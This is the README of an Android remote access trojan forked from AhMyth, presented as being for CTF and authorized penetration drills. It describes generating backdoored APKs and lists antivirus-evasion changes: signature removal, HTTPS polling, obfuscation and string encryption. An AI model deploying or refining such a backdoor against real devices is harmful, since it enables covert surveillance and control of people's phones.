# piupiupiu

> ## ⚠️ 免责声明 / Disclaimer
> **本项目仅供学习与技术研究参考。严禁将其用于任何非法用途、未授权渗透测试或侵犯他人合法权益的行为。**
> **任何因使用本项目产生的法律后果与损害，均由使用者自行承担，开源者及二开者概不承担任何责任。**
>
> **This project is for learning and research reference ONLY. Any illegal, unauthorized, or malicious use is strictly prohibited. The authors accept NO responsibility for any misuse or damage.**

> **项目说明（中文）**
> `piupiupiu` 是基于 **AhMyth** 的二次开发（二开）版本。
> 本项目用于**内网 CTF 比赛**与**内网渗透演练**，仅限授权环境下的合法安全测试。

###### Beta Version
It consists of two parts :
* Server side : desktop application based on electron framework (control panel)
* Client side : android application


## 项目来源 / Origin
- 上游项目（upstream）：**AhMyth Android RAT**（[github.com/Morsmalleo/AhMyth](https://github.com/Morsmalleo/AhMyth)）
- 本仓库：piupiupiu —— AhMyth 的二开 / fork
- 主要改造点：明显特征值的消除，将ioSocket连接改为普通的 HTTPS 轮询，R8 / ProGuard(压缩 + 改名)，明文字符串加密。修了原项目上线后的一些小bug......



## 项目效果

VT检测率大概是原本的1/2以下。

为什么不能继续往下降了呢？详情见这篇文章：[学了点安卓免杀后有感 | Meteor_Kai](https://blog.meteorkai.top/2026/09/29/学了点安卓免杀后有感/)

额，但大概率是我太菜了好吧。




## Getting Started
### You have two options to install it
#### 1) From source code
###### Prerequisite :
* Electron (to start the app)
* Java (to generate apk backdoor)
* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
1. ```git clone https://github.com/piupiupiu/piupiupiu.git```
2. ```cd piupiupiu/piupiupiu-Server```
3. ```npm start```

#### 2) From binaries
###### Prerequisite :
* Download a binary from https://github.com/piupiupiu/piupiupiu/releases
* Java (to generate apk backdoor)

## Project Structure
* `piupiupiu-Server/` : Electron 控制面板（服务端）
* `piupiupiu-Client/` : Android 客户端（Gradle 工程）



---------------------------------------------------------------
##### Disclaimer: This tool is intended for authorized security testing and educational purposes only (内网 CTF / 内网渗透演练). The author is not responsible for any direct or indirect damage caused due to the misuse of this tool.
